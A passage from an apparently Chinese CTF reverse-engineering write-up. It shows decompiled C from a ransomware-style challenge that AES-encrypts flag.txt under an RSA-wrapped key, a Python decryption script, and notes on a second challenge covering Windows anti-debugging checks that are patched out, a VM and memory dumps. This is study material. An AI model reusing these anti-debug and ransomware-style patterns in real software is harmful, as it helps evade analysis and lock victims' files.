[esp+160h] [ebp-148h]</span></span><br><span class="line">  BigInteger v45; <span class="comment">// [esp+17Ch] [ebp-12Ch]</span></span><br><span class="line">  <span class="keyword">char</span> toWriteFileName[<span class="number">256</span>]; <span class="comment">// [esp+198h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [esp+2A4h] [ebp-4h]</span></span><br><span class="line">   </span><br><span class="line">  arg2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)a2;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  FILE_read = (FILE *)fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  FILE_read_1 = FILE_read;</span><br><span class="line">  FILE_read_2 = FILE_read;</span><br><span class="line">  <span class="keyword">if</span> ( !FILE_read )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag.txt not exist\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fseek((<span class="keyword">int</span>)FILE_read, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  len_0 = ftell((<span class="keyword">int</span>)FILE_read_1);</span><br><span class="line">  len_1 = len_0;</span><br><span class="line">  fseek((<span class="keyword">int</span>)FILE_read_1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  len = <span class="number">16</span> * (len_0 / <span class="number">16</span> + <span class="number">1</span>);</span><br><span class="line">  buf_read = (<span class="keyword">char</span> *)malloc_0(len);</span><br><span class="line">  buf_read_2 = buf_read;</span><br><span class="line">  <span class="built_in">memset</span>(buf_read, <span class="number">0</span>, len);</span><br><span class="line">  <span class="keyword">if</span> ( buf_read )</span><br><span class="line">  &#123;</span><br><span class="line">    fread(buf_read, <span class="number">1</span>, len_1, FILE_read_2);</span><br><span class="line">    keyLen = <span class="built_in">strlen</span>(aWannareverse);</span><br><span class="line">    buf_read_1 = buf_read;</span><br><span class="line">    key = aWannareverse;</span><br><span class="line">    v12 = keyLen &lt; <span class="number">4</span>;</span><br><span class="line">    v11 = keyLen - <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">      <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( *(_DWORD *)buf_read_1 == *(_DWORD *)key )</span><br><span class="line">      &#123;</span><br><span class="line">        buf_read_1 += <span class="number">4</span>;</span><br><span class="line">        key += <span class="number">4</span>;</span><br><span class="line">        v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">        v11 -= <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v12 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = (<span class="keyword">unsigned</span> __int8)*buf_read_1 &lt; (<span class="keyword">unsigned</span> __int8)*key;</span><br><span class="line">    <span class="keyword">if</span> ( *buf_read_1 != *key</span><br><span class="line">      || v11 != <span class="number">-3</span></span><br><span class="line">      &amp;&amp; ((v13 = buf_read_1[<span class="number">1</span>], v12 = v13 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">1</span>], v13 != key[<span class="number">1</span>])</span><br><span class="line">       || v11 != <span class="number">-2</span></span><br><span class="line">       &amp;&amp; ((v14 = buf_read_1[<span class="number">2</span>], v12 = v14 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">2</span>], v14 != key[<span class="number">2</span>])</span><br><span class="line">        || v11 != <span class="number">-1</span> &amp;&amp; (v15 = buf_read_1[<span class="number">3</span>], v12 = v15 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">3</span>], v15 != key[<span class="number">3</span>]))) )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = -v12 | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(key_1, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">      v41 = <span class="number">16</span>;</span><br><span class="line">      v40 = <span class="number">0</span>;</span><br><span class="line">      getKey((<span class="keyword">int</span> *)key_1);                     <span class="comment">// initKey</span></span><br><span class="line">      v47 = <span class="number">0</span>;</span><br><span class="line">      v44.next = <span class="number">0</span>;</span><br><span class="line">      v44.len = <span class="number">0</span>;</span><br><span class="line">      v44.maxLen = <span class="number">0</span>;</span><br><span class="line">      v17 = (BigInteger *)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">      v44.next = v17;</span><br><span class="line">      v17-&gt;next = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)v17-&gt;data = <span class="number">0</span>;</span><br><span class="line">      v44.next-&gt;next = &amp;v44;</span><br><span class="line">      v44.len = <span class="number">0</span>;</span><br><span class="line">      v44.maxLen = <span class="number">15</span>;</span><br><span class="line">      v44.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v47 = <span class="number">1</span>;</span><br><span class="line">      append(&amp;v44, (<span class="keyword">int</span>)aWannareverse, <span class="number">13u</span>);    <span class="comment">// toDebug</span></span><br><span class="line">      LOBYTE(v47) = <span class="number">2</span>;</span><br><span class="line">      v45.next = <span class="number">0</span>;</span><br><span class="line">      v45.len = <span class="number">0</span>;</span><br><span class="line">      v45.maxLen = <span class="number">0</span>;</span><br><span class="line">      v18 = (BigInteger *)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">      v45.next = v18;</span><br><span class="line">      v18-&gt;next = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)v18-&gt;data = <span class="number">0</span>;</span><br><span class="line">      v45.next-&gt;next = &amp;v45;</span><br><span class="line">      v45.len = <span class="number">0</span>;</span><br><span class="line">      v45.maxLen = <span class="number">15</span>;</span><br><span class="line">      v45.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">      initBigInteger(&amp;v43, arg2);</span><br><span class="line">      LOBYTE(v47) = <span class="number">4</span>;</span><br><span class="line">      v19 = (BigInteger *)rsaEncrypt((<span class="keyword">int</span>)v42, (<span class="keyword">int</span>)&amp;v43);</span><br><span class="line">      <span class="keyword">if</span> ( &amp;v45 != v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">        LOBYTE(arg2) = <span class="number">0</span>;</span><br><span class="line">        base64((<span class="keyword">char</span> *)&amp;v45, v19, (<span class="keyword">int</span>)arg2);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_403580(v42);</span><br><span class="line">      sub_4037D0(v42);</span><br><span class="line">      LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">      sub_403580((<span class="keyword">int</span> *)&amp;v43);</span><br><span class="line">      sub_4037D0((<span class="keyword">int</span> *)&amp;v43);</span><br><span class="line">      v20 = v45.data;</span><br><span class="line">      <span class="keyword">if</span> ( v45.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">        v20 = *(<span class="keyword">char</span> **)v45.data;</span><br><span class="line">      v21 = (BigInteger *)sub_4024D0(v20, v42, v45.len);</span><br><span class="line">      <span class="keyword">if</span> ( &amp;v45 != v21 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">        LOBYTE(arg2) = <span class="number">0</span>;</span><br><span class="line">        base64((<span class="keyword">char</span> *)&amp;v45, v21, (<span class="keyword">int</span>)arg2);</span><br><span class="line">      &#125;</span><br><span class="line">      LOBYTE(v47) = <span class="number">3</span>;</span><br><span class="line">      sub_403580(v42);</span><br><span class="line">      sub_4037D0(v42);</span><br><span class="line">      v22 = v45.data;</span><br><span class="line">      <span class="keyword">if</span> ( v45.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">        v22 = *(<span class="keyword">char</span> **)v45.data;</span><br><span class="line">      append(&amp;v44, (<span class="keyword">int</span>)v22, v45.len);</span><br><span class="line">      v23 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( *(_OWORD *)&amp;v43.data[<span class="number">8</span>] = <span class="number">0</span>i64; v23 &lt; len; v23 += <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        aes((<span class="keyword">int</span>)&amp;v43.data[<span class="number">8</span>], (<span class="keyword">unsigned</span> __int8 *)&amp;buf_read_2[v23], (<span class="keyword">int</span>)key_1);</span><br><span class="line">        append(&amp;v44, (<span class="keyword">int</span>)&amp;v43.data[<span class="number">8</span>], <span class="number">0x10</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(toWriteFileName, <span class="number">0</span>, <span class="number">256</span>);          <span class="comment">// make file name</span></span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = aFlagTxt[v24++];</span><br><span class="line">        *((_BYTE *)&amp;v45.maxLen + v24 + <span class="number">3</span>) = v25;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v25 );</span><br><span class="line">      v26 = (<span class="keyword">char</span> *)&amp;v45.maxLen + <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v27 = (v26++)[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">while</span> ( v27 );</span><br><span class="line">      <span class="built_in">strcpy</span>(v26, <span class="string">&quot;.Encry&quot;</span>);</span><br><span class="line">      v37 = <span class="number">0</span>;</span><br><span class="line">      FILE_write = fopen(toWriteFileName, <span class="string">&quot;wb&quot;</span>);<span class="comment">// make file name</span></span><br><span class="line">      v29 = FILE_write;</span><br><span class="line">      <span class="keyword">if</span> ( FILE_write )</span><br><span class="line">      &#123;</span><br><span class="line">        v30 = v44.len;</span><br><span class="line">        v31 = v44.data;</span><br><span class="line">        <span class="keyword">if</span> ( v44.maxLen &gt;= <span class="number">0x10</span>u )</span><br><span class="line">          LOBYTE(v31) = v44.data[<span class="number">0</span>];</span><br><span class="line">        v32 = fwrite((<span class="keyword">char</span>)v31, <span class="number">1</span>, v44.len, FILE_write);</span><br><span class="line">        v33 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v30 == v32 )</span><br><span class="line">          v33 = <span class="number">1</span>;</span><br><span class="line">        v37 = v33;</span><br><span class="line">      &#125;</span><br><span class="line">      fclose(v29);</span><br><span class="line">      sub_403580((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">      sub_4037D0((<span class="keyword">int</span> *)&amp;v45);</span><br><span class="line">      sub_403580((<span class="keyword">int</span> *)&amp;v44);</span><br><span class="line">      sub_4037D0((<span class="keyword">int</span> *)&amp;v44);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_415950(buf_read_2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(FILE_read_2);</span><br><span class="line">  <span class="keyword">return</span> v37;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 主要做了以下事情：</p>
<ol>
<li>打开文件，判断文件头，如果是WannaReverse就不加密直接退出</li>
<li>打开一个buffer，然后放入WannaReverse</li>
<li>使用RSA加密上一步生成的密钥然后base64</li>
<li>把加密过的密钥放入buffer</li>
<li>AES加密文件内容，然后放入buffer</li>
<li>生成文件名，写入文件</li>
</ol>
</li>
<li><p>RSA私钥在clickme.exe中可以找到</p>
</li>
</ol>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES,PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x5C</span>,<span class="number">0xBC</span>,<span class="number">0xEA</span>,<span class="number">0x89</span>,<span class="number">0xBA</span>,<span class="number">0x2B</span>,<span class="number">0x18</span>,<span class="number">0x27</span>,<span class="number">0x79</span>,<span class="number">0x3F</span>,<span class="number">0x13</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x97</span>,<span class="number">0xB4</span>,<span class="number">0x9B</span>,<span class="number">0xCD</span>,<span class="number">0x78</span>,<span class="number">0x9B</span>,<span class="number">0xD8</span>,<span class="number">0x35</span>,<span class="number">0x92</span>,<span class="number">0x05</span>,<span class="number">0x45</span>,<span class="number">0x4C</span>,<span class="number">0x22</span>,<span class="number">0xA5</span>,<span class="number">0x69</span>,<span class="number">0x37</span>,<span class="number">0xEB</span>,<span class="number">0x6E</span>,<span class="number">0x2B</span>,<span class="number">0x0E</span>,<span class="number">0xBD</span>,<span class="number">0x84</span>,<span class="number">0x0F</span>,<span class="number">0x91</span>,<span class="number">0x61</span>,<span class="number">0x38</span>,<span class="number">0xF6</span>,<span class="number">0xF1</span>,<span class="number">0xBA</span>,<span class="number">0x99</span>,<span class="number">0x19</span>,<span class="number">0x41</span>,<span class="number">0x72</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0xF0</span>,<span class="number">0x26</span>,<span class="number">0x68</span>,<span class="number">0x06</span>,<span class="number">0x61</span>,<span class="number">0x26</span>,<span class="number">0x5C</span>,<span class="number">0x20</span>,<span class="number">0x35</span>,<span class="number">0xDD</span>,<span class="number">0xCF</span>,<span class="number">0xFC</span>,<span class="number">0x77</span>,<span class="number">0x57</span>,<span class="number">0x54</span>,<span class="number">0x81</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0xE4</span>,<span class="number">0xAF</span>,<span class="number">0xBF</span>,<span class="number">0xA2</span>,<span class="number">0x1D</span>,<span class="number">0x29</span>,<span class="number">0xAE</span>,<span class="number">0x6C</span>,<span class="number">0x08</span>,<span class="number">0x3B</span>,<span class="number">0x76</span>,<span class="number">0x1B</span>,<span class="number">0x66</span>,<span class="number">0xB8</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xCB</span>,<span class="number">0xD6</span>,<span class="number">0x94</span>,<span class="number">0xC3</span>,<span class="number">0xD5</span>,<span class="number">0x6A</span>,<span class="number">0xE7</span>,<span class="number">0x0C</span>,<span class="number">0x7A</span>,<span class="number">0x28</span>,<span class="number">0xDC</span>,<span class="number">0xBC</span>,<span class="number">0xAC</span>,<span class="number">0x80</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;30776159143604297789676442413079&#x27;</span></span><br><span class="line">aes = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">r = aes.decrypt(bytes(a))</span><br><span class="line">print(str(r,encoding=<span class="string">&#x27;utf-16&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="rev-V-amp-N2020-公开赛-h01k-re"><a href="#rev-V-amp-N2020-公开赛-h01k-re" class="headerlink" title="[rev][V&amp;N2020 公开赛]h01k_re"></a>[rev][V&amp;N2020 公开赛]h01k_re</h2><p>找到了这篇文章<a target="_blank" rel="noopener" href="https://www.gironsec.com/blog/2013/12/other-antidebug-tricks/">https://www.gironsec.com/blog/2013/12/other-antidebug-tricks/</a><br><a target="_blank" rel="noopener" href="https://www.sohu.com/a/249321179_354899">https://www.sohu.com/a/249321179_354899</a><br>CsrGetProcessId is a native API that returns the PID of csrss.exe<br>这个函数返回csrss.exe的PID</p>
<p>大概是一种反调试技术,程序尝试获取csrss.exe的pid，然后openProcess。由于大多数调制器需要管理越权限，所以如果当前进程成功打开csrss.exe，就可以判断为被调试。</p>
<p>CheckRemoteDebuggerPresent</p>
<p>NtQueryInformationProcess第三个参数，如果有调试器，就会返回-1</p>
<p>好家伙一整个反调试函数，我直接给你nop掉</p>
<p>__rdtsc返回时间辍</p>
<p>经过调试发现程序把自己载入内存，然后查找getflag函数，似乎作了一些变换，但是不去管，我tm直接将对应的区段保存为文件，然后是个可执行文件，IDA打开</p>
<ol>
<li><p>v3的信息：</p>
<ul>
<li>0是个计数器</li>
<li>14是v7，v7+8是输入长度，v7+20为off input-off v4</li>
<li>1是800</li>
<li>12是和800有关的数</li>
<li>13是off v4</li>
</ul>
</li>
<li><p>看答案了，确实是虚拟机，可以在输入下硬件断点，发现是一组异或</p>
</li>
<li><p>对于输入下硬件断点，并且输入经过处理后存入的目标内存也下硬件断点，就可以调试出程序的主逻辑</p>
</li>
</ol>
<p>后续分析</p>
<ol>
<li><p>以上分析到了vm，进入到vm，首先是个大循环，下面有个函数调用，参数是10006890，调试获得这个地方真实的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">10096890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line">100968A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line">100968B0 01 00 00 00 00 00 00 00 80 97 00 10 00 00 00 00 ................</span><br><span class="line">100968C0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100968D0 02 00 00 00 00 00 00 00 C0 97 00 10 00 00 00 00 ........À.......</span><br><span class="line">100968E0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100968F0 03 00 00 00 00 00 00 00 A0 95 00 10 00 00 00 00 ........ .......</span><br><span class="line">10096900 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096910 04 00 00 00 00 00 00 00 F0 95 00 10 00 00 00 00 ........ð.......</span><br><span class="line">10096920 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096930 05 00 00 00 00 00 00 00 30 97 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096940 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096950 06 00 00 00 20 00 9D 00 E0 96 00 10 00 00 00 00 .... ...à.......</span><br><span class="line">10096960 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096970 07 00 00 00 FF FF FF FF 40 96 00 10 00 00 00 00 ....ÿÿÿÿ@.......</span><br><span class="line">10096980 00 00 00 00 00 00 00 00 02 00 00 00 01 00 00 00 ................</span><br><span class="line">10096990 08 00 00 00 00 00 00 00 90 96 00 10 00 00 00 00 ................</span><br><span class="line">100969A0 00 00 00 00 00 00 00 00 02 00 00 00 AC 06 02 77 ............¬..w</span><br><span class="line">100969B0 09 00 00 00 00 00 00 00 80 75 00 10 00 00 00 00 .........u......</span><br><span class="line">100969C0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100969D0 0A 00 00 00 00 00 00 00 D0 75 00 10 00 00 00 00 ........Ðu......</span><br><span class="line">100969E0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">100969F0 0B 00 00 00 70 F7 36 00 20 A0 00 10 00 00 00 00 ....p÷6.  ......</span><br><span class="line">10096A00 00 00 00 00 00 00 00 00 02 00 00 00 34 B2 00 10 ............4²..</span><br><span class="line">10096A10 0C 00 00 00 A0 07 00 00 70 A0 00 10 00 00 00 00 .... ...p ......</span><br><span class="line">10096A20 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096A30 0D 00 00 00 00 00 00 00 30 98 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096A40 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096A50 0E 00 00 00 00 E0 FD 7E 80 98 00 10 00 00 00 00 .....àý~........</span><br><span class="line">10096A60 00 00 00 00 00 00 00 00 02 00 00 00 18 00 00 00 ................</span><br><span class="line">10096A70 0F 00 00 00 66 34 03 77 10 80 00 10 00 00 00 00 ....f4.w........</span><br><span class="line">10096A80 00 00 00 00 00 00 00 00 02 00 00 00 48 B5 79 00 ............Hµy.</span><br><span class="line">10096A90 10 00 00 00 00 00 79 00 70 80 00 10 00 00 00 00 ......y.p.......</span><br><span class="line">10096AA0 00 00 00 00 00 00 00 00 02 00 00 00 0C 2A 08 01 .............*..</span><br><span class="line">10096AB0 11 00 00 00 FF FF FF FF 40 99 00 10 00 00 00 00 ....ÿÿÿÿ@.......</span><br><span class="line">10096AC0 00 00 00 00 00 00 00 00 02 00 00 00 4C 17 00 00 ............L...</span><br><span class="line">10096AD0 12 00 00 00 99 5A 00 00 90 99 00 10 00 00 00 00 .....Z..........</span><br><span class="line">10096AE0 00 00 00 00 00 00 00 00 02 00 00 00 33 00 00 00 ............3...</span><br><span class="line">10096AF0 13 00 00 00 00 00 00 00 20 AB 00 10 00 00 00 00 ........ «......</span><br><span class="line">10096B00 00 00 00 00 00 00 00 00 02 00 00 00 C0 00 00 00 ............À...</span><br><span class="line">10096B10 14 00 00 00 B9 AC 08 77 70 AB 00 10 00 00 00 00 ....¹¬.wp«......</span><br><span class="line">10096B20 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096B30 15 00 00 00 02 1E 7A 00 70 76 00 10 00 00 00 00 ......z.pv......</span><br><span class="line">10096B40 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096B50 16 00 00 00 A0 07 00 00 C0 76 00 10 00 00 00 00 .... ...Àv......</span><br><span class="line">10096B60 00 00 00 00 00 00 00 00 02 00 00 00 D7 EE 02 77 ............×î.w</span><br><span class="line">10096B70 17 00 00 00 00 00 79 01 00 99 00 10 00 00 00 00 ......y.........</span><br><span class="line">10096B80 00 00 00 00 00 00 00 00 01 00 00 00 FE FF FF FF ............þÿÿÿ</span><br><span class="line">10096B90 18 00 00 00 06 14 0D 77 E0 9D 00 10 00 00 00 00 .......wà.......</span><br><span class="line">10096BA0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................</span><br><span class="line">10096BB0 19 00 00 00 04 00 00 00 30 9E 00 10 00 00 00 00 ........0.......</span><br><span class="line">10096BC0 00 00 00 00 00 00 00 00 02 00 00 00 22 14 0D 77 ............&quot;..w</span><br><span class="line">10096BD0 1A 00 00 00 00 00 00 00 90 9E 00 10 00 00 00 00 ................</span><br><span class="line">10096BE0 00 00 00 00 00 00 00 00 02 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096BF0 1B 00 00 00 20 00 00 00 E0 9E 00 10 00 00 00 00 .... ...à.......</span><br><span class="line">10096C00 00 00 00 00 00 00 00 00 02 00 00 00 3D 30 03 77 ............&#x3D;0.w</span><br><span class="line">10096C10 1C 00 00 00 A4 F5 36 00 C0 7E 00 10 00 00 00 00 ....¤õ6.À~......</span><br><span class="line">10096C20 00 00 00 00 00 00 00 00 02 00 00 00 B0 1D 7A 00 ............°.z.</span><br><span class="line">10096C30 1D 00 00 00 CD 4D 07 77 80 9A 00 10 00 00 00 00 ....ÍM.w........</span><br><span class="line">10096C40 00 00 00 00 00 00 00 00 01 00 00 00 00 10 50 00 ..............P.</span><br><span class="line">10096C50 1E 00 00 00 03 00 0A 00 C0 9A 00 10 00 00 00 00 ........À.......</span><br><span class="line">10096C60 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096C70 1F 00 00 00 00 00 79 00 E0 99 00 10 00 00 00 00 ......y.à.......</span><br><span class="line">10096C80 00 00 00 00 00 00 00 00 01 00 00 00 E8 1F 7A 00 ............è.z.</span><br><span class="line">10096C90 20 00 00 00 A8 F4 36 00 F0 7A 00 10 00 00 00 00  ...¨ô6.ðz......</span><br><span class="line">10096CA0 00 00 00 00 00 00 00 00 01 00 00 00 2C 1B 0D 77 ............,..w</span><br><span class="line">10096CB0 21 00 00 00 2C 1B 0D 77 50 7B 00 10 00 00 00 00 !...,..wP&#123;......</span><br><span class="line">10096CC0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096CD0 22 00 00 00 00 00 50 00 B0 7B 00 10 00 00 00 00 &quot;.....P.°&#123;......</span><br><span class="line">10096CE0 00 00 00 00 00 00 00 00 01 00 00 00 E0 1F 7A 00 ............à.z.</span><br><span class="line">10096CF0 23 00 00 00 E0 1F 7A 00 10 7C 00 10 00 00 00 00 #...à.z..|......</span><br><span class="line">10096D00 00 00 00 00 00 00 00 00 01 00 00 00 48 1B 0D 77 ............H..w</span><br><span class="line">10096D10 24 00 00 00 AC 49 06 77 70 9D 00 10 00 00 00 00 $...¬I.wp.......</span><br><span class="line">10096D20 00 00 00 00 00 00 00 00 00 00 00 00 66 34 03 77 ............f4.w</span><br><span class="line">10096D30 25 00 00 00 54 F4 36 00 F0 92 00 10 00 00 00 00 %...Tô6.ð.......</span><br><span class="line">10096D40 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ................</span><br><span class="line">10096D50 26 00 00 00 B0 1D 7A 00 20 93 00 10 00 00 00 00 &amp;...°.z. .......</span><br><span class="line">10096D60 00 00 00 00 00 00 00 00 01 00 00 00 7F 00 00 00 ................</span><br><span class="line">10096D70 27 00 00 00 A6 06 00 00 90 7D 00 10 00 00 00 00 &#39;...¦....&#125;......</span><br><span class="line">10096D80 00 00 00 00 00 00 00 00 02 00 00 00 F8 03 00 00 ............ø...</span><br><span class="line">10096D90 28 00 00 00 50 01 79 00 20 7E 00 10 00 00 00 00 (...P.y. ~......</span><br><span class="line">10096DA0 00 00 00 00 00 00 00 00 02 00 00 00 E2 1F 7A 00 ............â.z.</span><br><span class="line">10096DB0 29 00 00 00 00 00 00 00 70 92 00 10 00 00 00 00 ).......p.......</span><br><span class="line">10096DC0 00 00 00 00 00 00 00 00 01 00 00 00 8C F4 36 00 .............ô6.</span><br><span class="line">10096DD0 2A 00 00 00 94 AA 08 77 B0 92 00 10 00 00 00 00 *....ª.w°.......</span><br><span class="line">10096DE0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096DF0 2B 00 00 00 B0 1D 7A 00 60 93 00 10 00 00 00 00 +...°.z.&#96;.......</span><br><span class="line">10096E00 00 00 00 00 00 00 00 00 01 00 00 00 74 F4 36 00 ............tô6.</span><br><span class="line">10096E10 2C 00 00 00 36 A4 08 77 A0 93 00 10 00 00 00 00 ,...6¤.w .......</span><br><span class="line">10096E20 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................</span><br><span class="line">10096E30 2D 00 00 00 00 02 04 06 30 90 00 10 00 00 00 00 